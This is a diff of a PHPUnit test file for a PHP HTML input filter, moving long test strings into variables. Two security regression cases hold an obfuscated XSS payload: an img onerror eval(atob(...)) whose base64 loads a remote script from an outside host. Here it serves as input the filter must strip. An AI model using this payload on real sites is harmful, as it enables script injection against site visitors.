@@ -32,8 +32,13 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	public function casesGeneric()
 	{
 		$input = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`' .
-			'abcdefghijklmnopqrstuvwxyz{|}~â‚¬â€šÆ’â€žâ€¦â€ â€¡Ë†â€°Å â€¹Å’Å½â€˜â€™â€œâ€�â€¢â€“â€”Ëœâ„¢Å¡â€ºÅ“Å¾Å¸Â¡Â¢Â£Â¤Â¥Â¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·' .
-			'Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€Ã�Ã‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹ÃŒÃ�ÃŽÃ�Ã�Ã‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃ�ÃžÃŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿';
+			'abcdefghijklmnopqrstuvwxyz{|}~â‚¬â€šÆ’â€žâ€¦â€ â€¡Ë†â€°Å â€¹Å’Å½â€˜â€™â€œâ' .
+			'€�â€¢â€“â€”Ëœâ„¢Å¡â€ºÅ“Å¾Å¸Â¡Â¢Â£Â¤Â¥Â' .
+			'¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·' .
+			'Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€Ã�Ã‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹' .
+			'ÃŒÃ�ÃŽÃ�Ã�Ã‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃ�ÃžÃ' .
+			'ŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã' .
+			'°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿';
 
 		return array(
 			'int_01' => array(
@@ -623,6 +628,10 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	 */
 	public function whitelistImg()
 	{
+		$security20110329bString = "<img src='<img src='/onerror=eval" .
+			"(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J" .
+			"jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ";
+
 		$casesSpecific = array(
 			'Kill script' => array(
 				'',
@@ -699,7 +708,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			),
 			'security_20110329b' => array(
 				'string',
-				"<img src='<img src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
+				$security20110329bString,
 				'<img /> ',
 				'From specific cases'
 			),
@@ -984,6 +993,15 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	 */
 	public function blacklist()
 	{
+		$quotesInText1 = '<p class="my_class">This is a = "test" ' .
+			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
+		$quotesInText2 = '<p class="my_class">This is a = "test" ' .
+			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
+		$normalNested1 = '<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>.' .
+			' This is <span class="myclass" font = "myfont" > some more</span> text.</p>';
+		$normalNested2 = '<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. ' .
+			'This is <span class="myclass" font="myfont"> some more</span> text.</p>';
+
 		$casesSpecific = array(
 			'security_tracker_24802_a' => array(
 				'',
@@ -1071,14 +1089,14 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			),
 			'quotes_in_text' => array(
 				'string',
-				'<p class="my_class">This is a = "test" <a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>',
-				'<p class="my_class">This is a = "test" <a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>',
+				$quotesInText1,
+				$quotesInText2,
 				'Test valid nested tag'
 			),
 			'normal_nested' => array(
 				'string',
-				'<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>. This is <span class="myclass" font = "myfont" > some more</span> text.</p>',
-				'<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. This is <span class="myclass" font="myfont"> some more</span> text.</p>',
+				$normalNested1,
+				$normalNested2,
 				'Test valid nested tag'
 			),
 			'hanging_quote' => array(
@@ -1193,6 +1211,11 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	 */
 	public function blacklistImg()
 	{
+		$security20110328String = "<img src='<img src='/onerror=" .
+			"eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV" .
+			"tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=" .
+			"/.source))//'/> ";
+
 		$casesSpecific = array(
 			'Kill script' => array(
 				'',
@@ -1245,8 +1268,7 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			),
 			'security_20110328' => array(
 				'string',
-				"<img src='<img
-src='/onerror=eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ",
+				$security20110328String,
 				' ',
 				'From specific cases'
 			),
